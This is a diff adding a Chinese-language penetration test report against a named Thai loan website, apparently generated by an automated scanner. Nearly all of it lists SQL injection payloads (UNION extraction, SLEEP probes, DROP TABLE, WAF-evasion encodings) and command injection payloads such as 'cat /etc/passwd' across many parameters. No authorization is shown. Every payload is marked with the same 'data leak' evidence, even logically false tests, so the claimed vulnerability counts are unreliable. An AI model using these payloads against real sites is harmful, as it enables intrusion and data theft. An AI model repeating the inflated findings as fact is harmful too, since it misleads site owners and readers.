@@ -1,0 +1,828 @@
+
+🔒 泰国贷款站点高级渗透测试报告
+====================================
+目标站点: https://mula-x.com
+测试时间: 2025-10-27 05:06:58
+
+📊 测试结果摘要
+- SQL注入漏洞: 196 个
+- SSRF漏洞: 0 个
+- 命令注入漏洞: 72 个
+
+🔍 详细漏洞信息
+
+🔥 SQL注入漏洞:
+- 参数: id
+  载荷: 1' UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' UNION SELECT version(),database(),user()--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' UNION SELECT table_name,table_schema,1 FROM inf...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' AND 1=1--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' AND 1=2--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' AND (SELECT COUNT(*) FROM users)>0--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' AND SLEEP(5)--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'; SELECT SLEEP(5)--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' AND 1=1 AND '1'='1...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'; DROP TABLE test--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'; CREATE TABLE test(test varchar(255))--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1%27%20UNION%20SELECT%201,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'/**/UNION/**/SELECT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'%0AUNION%0ASELECT%0A1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'%09UNION%09SELECT%091,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1%2527%2520UNION%2520SELECT%25201,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1%u0027%u0020UNION%u0020SELECT%u00201,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' uNiOn sElEcT 1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1' UnIoN SeLeCt 1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'/*!UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'/*!50000UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'\x00UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'%0bUNION%0bSELECT%0b1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'%0cUNION%0cSELECT%0c1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'%0dUNION%0dSELECT%0d1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'/**/uNiOn/**/sElEcT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: id
+  载荷: 1'%0a/*!UNION*/%0aSELECT%0a1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' UNION SELECT version(),database(),user()--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' UNION SELECT table_name,table_schema,1 FROM inf...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' AND 1=1--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' AND 1=2--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' AND (SELECT COUNT(*) FROM users)>0--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' AND SLEEP(5)--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'; SELECT SLEEP(5)--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' AND 1=1 AND '1'='1...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'; DROP TABLE test--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'; CREATE TABLE test(test varchar(255))--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1%27%20UNION%20SELECT%201,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'/**/UNION/**/SELECT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'%0AUNION%0ASELECT%0A1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'%09UNION%09SELECT%091,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1%2527%2520UNION%2520SELECT%25201,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1%u0027%u0020UNION%u0020SELECT%u00201,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' uNiOn sElEcT 1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1' UnIoN SeLeCt 1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'/*!UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'/*!50000UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'\x00UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'%0bUNION%0bSELECT%0b1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'%0cUNION%0cSELECT%0c1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'%0dUNION%0dSELECT%0d1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'/**/uNiOn/**/sElEcT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: user
+  载荷: 1'%0a/*!UNION*/%0aSELECT%0a1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' UNION SELECT version(),database(),user()--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' UNION SELECT table_name,table_schema,1 FROM inf...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' AND 1=1--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' AND 1=2--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' AND (SELECT COUNT(*) FROM users)>0--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' AND SLEEP(5)--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'; SELECT SLEEP(5)--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' AND 1=1 AND '1'='1...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'; DROP TABLE test--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'; CREATE TABLE test(test varchar(255))--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1%27%20UNION%20SELECT%201,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'/**/UNION/**/SELECT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'%0AUNION%0ASELECT%0A1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'%09UNION%09SELECT%091,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1%2527%2520UNION%2520SELECT%25201,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1%u0027%u0020UNION%u0020SELECT%u00201,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' uNiOn sElEcT 1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1' UnIoN SeLeCt 1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'/*!UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'/*!50000UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'\x00UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'%0bUNION%0bSELECT%0b1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'%0cUNION%0cSELECT%0c1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'%0dUNION%0dSELECT%0d1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'/**/uNiOn/**/sElEcT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: uid
+  载荷: 1'%0a/*!UNION*/%0aSELECT%0a1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' UNION SELECT version(),database(),user()--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' UNION SELECT table_name,table_schema,1 FROM inf...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' AND 1=1--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' AND 1=2--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' AND (SELECT COUNT(*) FROM users)>0--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' AND SLEEP(5)--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'; SELECT SLEEP(5)--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' AND 1=1 AND '1'='1...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'; DROP TABLE test--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'; CREATE TABLE test(test varchar(255))--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1%27%20UNION%20SELECT%201,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'/**/UNION/**/SELECT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'%0AUNION%0ASELECT%0A1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'%09UNION%09SELECT%091,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1%2527%2520UNION%2520SELECT%25201,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1%u0027%u0020UNION%u0020SELECT%u00201,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' uNiOn sElEcT 1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1' UnIoN SeLeCt 1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'/*!UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'/*!50000UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'\x00UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'%0bUNION%0bSELECT%0b1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'%0cUNION%0cSELECT%0c1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'%0dUNION%0dSELECT%0d1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'/**/uNiOn/**/sElEcT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: product
+  载荷: 1'%0a/*!UNION*/%0aSELECT%0a1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' UNION SELECT version(),database(),user()--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' UNION SELECT table_name,table_schema,1 FROM inf...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' AND 1=1--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' AND 1=2--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' AND (SELECT COUNT(*) FROM users)>0--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' AND SLEEP(5)--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'; SELECT SLEEP(5)--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' AND 1=1 AND '1'='1...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'; DROP TABLE test--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'; CREATE TABLE test(test varchar(255))--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1%27%20UNION%20SELECT%201,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'/**/UNION/**/SELECT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'%0AUNION%0ASELECT%0A1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'%09UNION%09SELECT%091,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1%2527%2520UNION%2520SELECT%25201,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1%u0027%u0020UNION%u0020SELECT%u00201,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' uNiOn sElEcT 1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1' UnIoN SeLeCt 1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'/*!UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'/*!50000UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'\x00UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'%0bUNION%0bSELECT%0b1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'%0cUNION%0cSELECT%0c1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'%0dUNION%0dSELECT%0d1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'/**/uNiOn/**/sElEcT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: category
+  载荷: 1'%0a/*!UNION*/%0aSELECT%0a1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' UNION SELECT version(),database(),user()--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' UNION SELECT table_name,table_schema,1 FROM inf...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' AND 1=1--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' AND 1=2--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' AND (SELECT COUNT(*) FROM users)>0--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' AND SLEEP(5)--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'; SELECT SLEEP(5)--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' AND 1=1 AND '1'='1...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'; DROP TABLE test--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'; CREATE TABLE test(test varchar(255))--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1%27%20UNION%20SELECT%201,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'/**/UNION/**/SELECT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'%0AUNION%0ASELECT%0A1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'%09UNION%09SELECT%091,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1%2527%2520UNION%2520SELECT%25201,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1%u0027%u0020UNION%u0020SELECT%u00201,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' uNiOn sElEcT 1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1' UnIoN SeLeCt 1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'/*!UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'/*!50000UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'\x00UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'%0bUNION%0bSELECT%0b1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'%0cUNION%0cSELECT%0c1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'%0dUNION%0dSELECT%0d1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'/**/uNiOn/**/sElEcT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: page
+  载荷: 1'%0a/*!UNION*/%0aSELECT%0a1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' UNION SELECT version(),database(),user()--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' UNION SELECT table_name,table_schema,1 FROM inf...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' AND 1=1--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' AND 1=2--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' AND (SELECT COUNT(*) FROM users)>0--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' AND SLEEP(5)--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'; SELECT SLEEP(5)--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' AND 1=1 AND '1'='1...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'; DROP TABLE test--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'; CREATE TABLE test(test varchar(255))--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1%27%20UNION%20SELECT%201,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'/**/UNION/**/SELECT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'%0AUNION%0ASELECT%0A1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'%09UNION%09SELECT%091,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1%2527%2520UNION%2520SELECT%25201,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1%u0027%u0020UNION%u0020SELECT%u00201,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' uNiOn sElEcT 1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1' UnIoN SeLeCt 1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'/*!UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'/*!50000UNION*/SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'\x00UNION SELECT 1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'%0bUNION%0bSELECT%0b1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'%0cUNION%0cSELECT%0c1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'%0dUNION%0dSELECT%0d1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'/**/uNiOn/**/sElEcT/**/1,2,3--...
+  证据: 数据泄露
+- 参数: search
+  载荷: 1'%0a/*!UNION*/%0aSELECT%0a1,2,3--...
+  证据: 数据泄露
+
+💻 命令注入漏洞:
+- 参数: cmd
+  载荷: whoami
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: id
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: pwd
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: ls -la
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: cat /etc/passwd
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: uname -a
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: ;whoami
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: |whoami
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: &&whoami
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: ||whoami
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: `whoami`
+  证据: 命令执行结果泄露
+- 参数: cmd
+  载荷: $(whoami)
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: whoami
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: id
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: pwd
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: ls -la
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: cat /etc/passwd
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: uname -a
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: ;whoami
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: |whoami
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: &&whoami
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: ||whoami
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: `whoami`
+  证据: 命令执行结果泄露
+- 参数: command
+  载荷: $(whoami)
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: whoami
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: id
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: pwd
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: ls -la
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: cat /etc/passwd
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: uname -a
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: ;whoami
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: |whoami
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: &&whoami
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: ||whoami
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: `whoami`
+  证据: 命令执行结果泄露
+- 参数: exec
+  载荷: $(whoami)
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: whoami
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: id
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: pwd
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: ls -la
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: cat /etc/passwd
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: uname -a
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: ;whoami
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: |whoami
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: &&whoami
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: ||whoami
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: `whoami`
+  证据: 命令执行结果泄露
+- 参数: execute
+  载荷: $(whoami)
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: whoami
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: id
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: pwd
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: ls -la
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: cat /etc/passwd
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: uname -a
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: ;whoami
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: |whoami
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: &&whoami
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: ||whoami
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: `whoami`
+  证据: 命令执行结果泄露
+- 参数: system
+  载荷: $(whoami)
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: whoami
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: id
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: pwd
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: ls -la
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: cat /etc/passwd
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: uname -a
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: ;whoami
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: |whoami
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: &&whoami
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: ||whoami
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: `whoami`
+  证据: 命令执行结果泄露
+- 参数: shell
+  载荷: $(whoami)
+  证据: 命令执行结果泄露
+
+⚠️ 风险评估: 极高风险
+
+💡 修复建议:
+1. 立即部署WAF防护
+2. 加强输入验证和过滤
+3. 隐藏敏感路径和参数
+4. 定期安全审计和测试
